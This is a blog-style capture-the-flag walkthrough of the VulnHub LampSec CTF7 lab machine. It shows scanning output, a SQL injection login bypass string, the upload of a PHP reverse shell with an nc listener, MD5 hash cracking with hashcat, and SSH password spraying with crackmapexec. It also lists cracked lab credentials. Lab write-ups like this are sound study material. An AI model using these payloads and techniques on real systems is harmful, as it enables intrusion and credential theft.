[{"title":"[vulnhub]  LampSec-CTF7","url":"/2023/05/23/LampSec-CTF7/","content":"\n\n\n靶机部署这台机子将其网卡设置为eth0。实际上的网卡是eth1。因此，我们需要删除配置文件&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0，并创建一个名为ifcfg-eth1的新文件。必须写在文件中的设置是ONBOOT=yes BOOTPROTO=dhcp DEVICE=eth1 #要配置的网卡名。然后service network restart就可以了。(在Cent OS 6中, 在大于等于7的版本应该使用systemctl)其实之后最好把靶机丢到vm里面选择已经移动别选复制，这样容易保障网络环境配置不出问题。\n信息收集┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sn 192.168.56.0/24[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:29 CSTNmap scan report for 192.168.56.1Host is up (0.0014s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.0010s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.141Host is up (0.00089s latency).MAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00060s latency).MAC Address: 00:50:56:E6:06:A3 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 2.02 seconds\n\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:30 CSTNmap scan report for 192.168.56.141Host is up (0.0011s latency).Not shown: 65507 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited)PORT      STATE  SERVICE22/tcp    open   ssh80/tcp    open   http137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn901/tcp   open   samba-swat5900/tcp  closed vnc8080/tcp  open   http-proxy10000/tcp open   snet-sensor-mgmtMAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds\n\n还开了挺多端口的，80，8080，139，10000都可以看看。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:39 CSTWarning: 192.168.56.141 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.141Host is up (0.0019s latency).All 65535 scanned ports on 192.168.56.141 are in ignored states.Not shown: 65457 open|filtered udp ports (no-response), 78 filtered udp ports (host-prohibited)MAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap done: 1 IP address (1 host up) scanned in 72.81 seconds\n\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:47 CSTNmap scan report for 192.168.56.141Host is up (0.00058s latency).PORT      STATE  SERVICE     VERSION22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)901/tcp   open   http        Samba SWAT administration server5900/tcp  closed vnc8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))10000/tcp open   http        MiniServ 1.610 (Webmin httpd)MAC Address: 00:0C:29:AC:12:E4 (VMware)Device type: general purposeRunning: Linux 2.6.X|3.XOS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3OS details: Linux 2.6.32 - 3.13Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 43.12 seconds\n\n趁其它还在扫描的时间先看看80端口吧。\nEXPLOITweb先目录发现一下，扫描的同时自己手动看看网页。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo dirb http://192.168.56.141                                                                                [sudo] password for kali: -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Tue May  2 22:34:27 2023URL_BASE: http://192.168.56.141/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------\n\n随便点点，发现有几个可以输入注册的地方，以及8080端口是个登录页面。\nSQLi加点&#39;看看有何反应。OK，存在sql注入漏洞。之后看看是否用sqlmap把库dump出来看看。再在登录页面试试。\n# 192.168.56.141:8080admin&#x27;) or 1=1 #-- -\n\n竟然直接登进来了。\n文件上传ok，不过一时间看不出是什么cms，那就找找有无什么可以上传文件的地方呗。Fortunetly, we find the way to upload files.We try our PoC of upload vuln.Seems that the &lt;?and?&gt; are filtered. However, even if we try to bypass the filter like &lt;sript language=&quot;php&quot;&gt;payload&lt;/script&gt;, the payload just doesn’t work.As a result, we must find the path of the uploaded shell.Oh, don’t forget we did web content discovery and it was done for sure. So let us take a look at it.\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo dirb http://192.168.56.141                                                                                [sudo] password for kali: -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Tue May  2 22:34:27 2023URL_BASE: http://192.168.56.141/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.56.141/ ----+ http://192.168.56.141/about (CODE:200|SIZE:4910)                                                                          ==&gt; DIRECTORY: http://192.168.56.141/assets/                                                                                + http://192.168.56.141/backups (CODE:301|SIZE:333)                                                                         + http://192.168.56.141/cgi-bin/ (CODE:403|SIZE:290)                                                                        + http://192.168.56.141/contact (CODE:200|SIZE:5017)                                                                        ==&gt; DIRECTORY: http://192.168.56.141/css/                                                                                   + http://192.168.56.141/db (CODE:200|SIZE:3904)                                                                             + http://192.168.56.141/default (CODE:200|SIZE:6058)                                                                        + http://192.168.56.141/footer (CODE:200|SIZE:3904)                                                                         + http://192.168.56.141/header (CODE:200|SIZE:3904)                                                                         ==&gt; DIRECTORY: http://192.168.56.141/img/                                                                                   ==&gt; DIRECTORY: http://192.168.56.141/inc/                                                                                   + http://192.168.56.141/index.php (CODE:200|SIZE:6058)                                                                      ==&gt; DIRECTORY: http://192.168.56.141/js/                                                                                    + http://192.168.56.141/newsletter (CODE:200|SIZE:4037)                                                                     + http://192.168.56.141/phpinfo (CODE:200|SIZE:58762)                                                                       + http://192.168.56.141/profile (CODE:200|SIZE:3977)                                                                        + http://192.168.56.141/read (CODE:302|SIZE:1)                                                                              + http://192.168.56.141/recovery (CODE:200|SIZE:4807)                                                                       + http://192.168.56.141/register (CODE:200|SIZE:6591)                                                                       + http://192.168.56.141/signup (CODE:200|SIZE:4783)                                                                         + http://192.168.56.141/usage (CODE:403|SIZE:287)                                                                           ==&gt; DIRECTORY: http://192.168.56.141/webalizer/                                                                             ==&gt; DIRECTORY: http://192.168.56.141/webmail/                                                                                                                                                                                                           ---- Entering directory: http://192.168.56.141/assets/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/css/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/img/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/inc/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/js/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/webalizer/ ----+ http://192.168.56.141/webalizer/index.html (CODE:200|SIZE:3671)                                                                                                                                                                                       ---- Entering directory: http://192.168.56.141/webmail/ ----+ http://192.168.56.141/webmail/bin (CODE:403|SIZE:293)                                                                     + http://192.168.56.141/webmail/config (CODE:403|SIZE:296)                                                                  + http://192.168.56.141/webmail/favicon.ico (CODE:200|SIZE:1150)                                                            + http://192.168.56.141/webmail/index.php (CODE:200|SIZE:5157)                                                              ==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/                                                                     + http://192.168.56.141/webmail/LICENSE (CODE:403|SIZE:297)                                                                 + http://192.168.56.141/webmail/logs (CODE:403|SIZE:294)                                                                    ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/                                                                       ==&gt; DIRECTORY: http://192.168.56.141/webmail/program/                                                                       + http://192.168.56.141/webmail/README (CODE:403|SIZE:296)                                                                  + http://192.168.56.141/webmail/robots.txt (CODE:200|SIZE:26)                                                               ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/                                                                         + http://192.168.56.141/webmail/SQL (CODE:403|SIZE:293)                                                                     + http://192.168.56.141/webmail/temp (CODE:403|SIZE:294)                                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/installer/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/images/                                                              + http://192.168.56.141/webmail/installer/index.php (CODE:302|SIZE:0)                                                                                                                                                                                   ---- Entering directory: http://192.168.56.141/webmail/plugins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/                                                               ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/emoticons/                                                             ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/                                                                  ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/                                                              ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/userinfo/                                                                                                                                                                                          ---- Entering directory: http://192.168.56.141/webmail/program/ ----(!) WARNING: All responses for this directory seem to be CODE = 403.                                                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/                                                                                                                                                                                             ---- Entering directory: http://192.168.56.141/webmail/installer/images/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/                                                                                                                                                                                     ---- Entering directory: http://192.168.56.141/webmail/plugins/emoticons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/content/                                                          ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/                                                                                                                                                                                        ---- Entering directory: http://192.168.56.141/webmail/plugins/password/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/drivers/                                                      ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/helpers/                                                      + http://192.168.56.141/webmail/plugins/password/README (CODE:200|SIZE:10645)                                                                                                                                                                           ---- Entering directory: http://192.168.56.141/webmail/plugins/userinfo/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/                                                          ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/includes/                                                        + http://192.168.56.141/webmail/skins/classic/README (CODE:200|SIZE:855)                                                    ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/templates/                                                                                                                                                                                   ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/classic/                                                                                                                                                                             ---- Entering directory: http://192.168.56.141/webmail/plugins/help/content/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/plugins/password/drivers/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/password/helpers/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/buttons/                                                  ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/display/                                                  + http://192.168.56.141/webmail/skins/classic/images/favicon.ico (CODE:200|SIZE:1150)                                       ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/icons/                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/skins/classic/includes/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/templates/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/classic/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/                                                                                                                                                                      ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/buttons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/display/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/icons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/ ----                                                                               /zt                                          -----------------END_TIME: Tue May  2 22:39:31 2023DOWNLOADED: 124624 - FOUND: 32\n\nAfter some munal try, we find out upload file in the path of 192.168.56.141/assets/.So we upload php-reverse-shell.And we curl our shell.php\n# curl http://192.168.56.141/assets/shell.php┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nc -lvp 443                                                           [sudo] password for kali: listening on [any] 443 ...192.168.56.141: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.141] 48031Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux 17:37:14 up  2:45,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHATuid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0sh: no job control in this shellsh-4.1$ whoamiwhoamiapachesh-4.1$ pwd/pwdsh-4.1$ ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:feac:12e4/64 scope link        valid_lft forever preferred_lft forever\n\nSucessfully get webshell.\nPrivilege Escalation先python spwan一个更稳定的shell。然后sudo -l需要密码，findsuid位文件没有能用的，cat /etc/crontab直接没有定时任务。OK。行吧，在上大招前先手工枚举一下吧。\nuname -a                                                                                     Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux \n\n版本挺低的，还是经典2.6，可以考虑内核提权。但是优先级往后稍稍吧。\n配置文件查看cd到&#x2F;home目录下，发现很多用户，然而没有read权限，没用，查不了是否有用户遗留的登录凭证。那就看看网站配置文件啥的吧，找点前后端连接用到的密码。\nbash-4.1$ cat config.inc.phpcat config.inc.php&lt;?php/* * Generated configuration file * Generated by: phpMyAdmin 3.5.4 setup script * Date: Wed, 19 Dec 2012 09:01:38 -0500 *//* Servers configuration */$i = 0;/* Server: localhost [1] */$i++;$cfg[&#x27;Servers&#x27;][$i][&#x27;verbose&#x27;] = &#x27;localhost&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;host&#x27;] = &#x27;localhost&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;port&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;socket&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;connect_type&#x27;] = &#x27;tcp&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;extension&#x27;] = &#x27;mysqli&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;nopassword&#x27;] = true;$cfg[&#x27;Servers&#x27;][$i][&#x27;auth_type&#x27;] = &#x27;cookie&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;user&#x27;] = &#x27;root&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;AllowNoPassword&#x27;] = TRUE;$cfg[&#x27;Servers&#x27;][$i][&#x27;AllowNoPasswordRoot&#x27;] = TRUE; /* End of servers configuration */$cfg[&#x27;blowfish_secret&#x27;] = &#x27;50d1c8ba084fd9.39888691&#x27;;$cfg[&#x27;DefaultLang&#x27;] = &#x27;en&#x27;;$cfg[&#x27;ServerDefault&#x27;] = 1;$cfg[&#x27;UploadDir&#x27;] = &#x27;&#x27;;$cfg[&#x27;SaveDir&#x27;] = &#x27;&#x27;;\n\n从网站config文件我们可以看到，数据root用户登录直接不用密码。那我之后可以登录一下数据库找点信息。\n敏感信息泄露再手动遍历了下网页目录，发现之前进不去的&#x2F;backups目录有个备份文件。我们查看一下，刚好最后几行记录了向数据库插入用户的账号密码等信息。\n/* /var/www/html/backups */LOCK TABLES `users` WRITE;/*!40000 ALTER TABLE `users` DISABLE KEYS */;INSERT INTO `users` VALUES (&#x27;webdev@localhost.localdomain&#x27;,&#x27;f7aa6066f95255096672e3a5fc537081&#x27;,1,NULL,13,&#x27;Developer account&#x27;,&#x27;Developer account for updating the site.&#x27;),(&#x27;brian@localhost.localdomain&#x27;,&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;,1,&#x27;2012-12-19 11:30:54&#x27;,3,&#x27;Brian Hershel&#x27;,&#x27;Brian is our technical brains behind the operations and a chief trainer.&#x27;),(&#x27;john@localhost.localdomain&#x27;,&#x27;0d9ff2a4396d6939f80ffe09b1280ee1&#x27;,1,NULL,4,&#x27;John Durham&#x27;,&#x27;&#x27;),(&#x27;alice@localhost.localdomain&#x27;,&#x27;2146bf95e8929874fc63d54f50f1d2e3&#x27;,1,NULL,5,&#x27;Alice Wonder&#x27;,&#x27;&#x27;),(&#x27;ruby@localhost.localdomain&#x27;,&#x27;9f80ec37f8313728ef3e2f218c79aa23&#x27;,0,NULL,6,&#x27;Ruby Spinster&#x27;,&#x27;&#x27;),(&#x27;leon@localhost.localdomain&#x27;,&#x27;5d93ceb70e2bf5daa84ec3d0cd2c731a&#x27;,0,NULL,7,&#x27;Leon Parnetta&#x27;,&#x27;&#x27;),(&#x27;julia@localhost.localdomain&#x27;,&#x27;ed2539fe892d2c52c42a440354e8e3d5&#x27;,0,NULL,8,&#x27;Julia Fields&#x27;,&#x27;&#x27;),(&#x27;michael@localhost.localdomain&#x27;,&#x27;9c42a1346e333a770904b2a2b37fa7d3&#x27;,0,NULL,9,&#x27;Michael Saint&#x27;,&#x27;&#x27;),(&#x27;bruce@localhost.localdomain&#x27;,&#x27;3a24d81c2b9d0d9aaf2f10c6c9757d4e&#x27;,0,NULL,10,&#x27;Bruce Pottricks&#x27;,&#x27;&#x27;),(&#x27;neil@localhost.localdomain&#x27;,&#x27;4773408d5358875b3764db552a29ca61&#x27;,0,NULL,11,&#x27;Neil Felstein&#x27;,&#x27;&#x27;),(&#x27;charles@localhost.localdomain&#x27;,&#x27;b2a97bcecbd9336b98d59d9324dae5cf&#x27;,0,NULL,12,&#x27;Charles Adams&#x27;,&#x27;&#x27;);/*!40000 ALTER TABLE `users` ENABLE KEYS */;\n\n我们提取一下登录凭证，把哈希值丢到crackstation。然后用得到的密码尝试直接ssh看看能不能成功登录。\nbrain:&#x27;&#x27;#竟然是md5的空值，草。webdev:&#x27;webdev&#x27;john:&#x27;transformersrule&#x27;\n\n试到第3个john的时候就成功了。\nbash-4.1$ su johnsu johnPassword: transformersrule[john@localhost backups]$ whoamiwhoamijohn[john@localhost backups]$ sudo -lsudo -l[sudo] password for john: transformersruleMatching Defaults entries for john on this host:    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser john may run the following commands on this host:    (ALL) ALL[john@localhost backups]$ sudo susudo su[root@localhost backups]# whoamiwhoamiroot[root@localhost backups]# ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:feac:12e4/64 scope link        valid_lft forever preferred_lft forever\n\n直接是sudo用户组的，直接提权成功。\n密码复用当然，我们也可以登录mysql数据库查看用户与密码。\n#mysql -uroot#show databases;#use users;#select * from users;mysql&gt; select username,password from users;select username,password from users;+-------------------------------+----------------------------------+| username                      | password                         |+-------------------------------+----------------------------------+| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 || john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 || alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 || ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 || leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a || julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 || michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 || bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e || neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 || charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf || foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a || 1@1.com                       | c4ca4238a0b923820dcc509a6f75849b || test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |+-------------------------------+----------------------------------+13 rows in set (0.00 sec)\n\n将这些凭证用sed与awk处理后，将hash值直接丢到hashcat中破解。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ hashcat -a 0 -m 0 passhash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==================================================================================================================================================* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 12 digests; 12 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 2 MBDictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 4 secsed2539fe892d2c52c42a440354e8e3d5:madrid                   4cb9c8a8048fd02294477fcb1a41191a:changeme                 5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234                 098f6bcd4621d373cade4e832627b4f6:test                     b2a97bcecbd9336b98d59d9324dae5cf:chuck33                  2146bf95e8929874fc63d54f50f1d2e3:turtles77                9c42a1346e333a770904b2a2b37fa7d3:somepassword             e22f07b17f98e0d9d364584ced0e3c18:my2cents                 Cracking performance lower than expected?                 * Append -O to the commandline.  This lowers the maximum supported password/salt length (usually down to 32).* Append -w 3 to the commandline.  This can cause your screen to lag.* Append -S to the commandline.  This has a drastic speed impact but can be better for specific attacks.  Typical scenarios are a small wordlist but a large ruleset.* Update your backend API runtime / driver the right way:  https://hashcat.net/faq/wrongdriver* Create more work items to make use of your parallelization power:  https://hashcat.net/faq/moreworkApproaching final keyspace - workload adjusted.                                                                     Session..........: hashcatStatus...........: ExhaustedHash.Mode........: 0 (MD5)Hash.Target......: passhashTime.Started.....: Wed May  3 14:34:10 2023 (6 secs)Time.Estimated...: Wed May  3 14:34:16 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:  2728.7 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 8/12 (66.67%) Digests (total), 8/12 (66.67%) Digests (new)Progress.........: 14344385/14344385 (100.00%)Rejected.........: 0/14344385 (0.00%)Restore.Point....: 14344385/14344385 (100.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]Hardware.Mon.#1..: Util: 28%Started: Wed May  3 14:33:41 2023Stopped: Wed May  3 14:34:17 2023\n\n我们用这些凭证进行密码喷洒攻击。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo crackmapexec ssh 192.168.56.141 -u username -p pass --continue-on-success | grep +SSH         192.168.56.141  22     192.168.56.141   [+] brian:my2cents SSH         192.168.56.141  22     192.168.56.141   [+] alice:turtles77 SSH         192.168.56.141  22     192.168.56.141   [+] leon:qwer1234 SSH         192.168.56.141  22     192.168.56.141   [+] julia:madrid SSH         192.168.56.141  22     192.168.56.141   [+] michael:somepassword SSH         192.168.56.141  22     192.168.56.141   [+] charles:chuck33\n\n非常OK。\n","tags":["Pentest"]}]